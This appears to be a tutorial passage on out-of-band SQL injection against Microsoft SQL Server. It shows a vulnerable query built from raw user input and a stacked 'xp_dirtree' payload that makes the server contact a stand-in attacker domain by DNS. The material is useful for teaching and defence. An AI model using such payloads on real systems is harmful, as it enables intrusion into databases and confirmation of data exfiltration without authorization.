<h3>Out-Band SQL Injections</h3>
Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server.

These sql injection involve in alternative channels to extract data from the server.
It might be HTTP(S) requests, DNS resolutions, file systems, E-mails, etc depending on the functionality of the back-end
technology.
most of those attacks will require the attacker to have a third party system like a proxy to gather data or listen to the response from the web application.
<br><br>
<h4> Example </h4>
<p>To understand how this type of sql injection works, let’s consider the following SQL query that executes on a Microsoft SQL Server database.</p>
<pre><code>SELECT * FROM products WHERE id={userInput}</code></pre>
<p>The value of <kbd>id</kbd> comes from user input, from a URL such as the following.</p>
<pre>https://example.com/products.aspx?id=1</pre>
<p>This URL will generate the following SQL query.</p>
<pre><code>SELECT * FROM products WHERE id=1</code></pre>

<p>Attacker can make attack using the  xp_dirtree command on microsoft sql server database.</p>
<pre>https://example.com/products.aspx?id=1;EXEC%20master..xp_dirtree%20'%5c%5ctest.attacker.com%5c'+--+</pre>
<p>Let’s URL decode this payload</p>
<pre>https://example.com/products.aspx?id=1;EXEC master..xp_dirtree '\\test.attacker.com\' --</pre>
<p>This will produce the following SQL query.</p>
<pre><code>SELECT * FROM products WHERE id=1;EXEC master..xp_dirtree '\\test.attacker.com\' -- </code></pre>
<p>What happened is that there are now two separated queries that SQL Server will execute.</p>
<pre><code>/* First Query */
SELECT * FROM products WHERE id=1

/* Second Query */
EXEC master..xp_dirtree '\\test.attacker.com\' -- </code></pre>
<p>The second query is invoking a stored procedure <kbd>xp_dirtree</kbd>. This extended stored procedure can be used to
    get a list of all the folders for the folder named in the xp.</p>
<p>SQL Server will now proceed to list all the folders from <em>\\test.attacker.com\</em>. To do this, it must first resolve the address of the domain
    <em>test.attacker.com</em>, for which it makes a DNS query to attacker’s DNS server. The attacker can monitor DNS server logs and look for queries to
    <em>test.attacker.com</em>.</p>
 This attack can be done only when the feature will be enable on the database , so the database can send dns queries and http requests
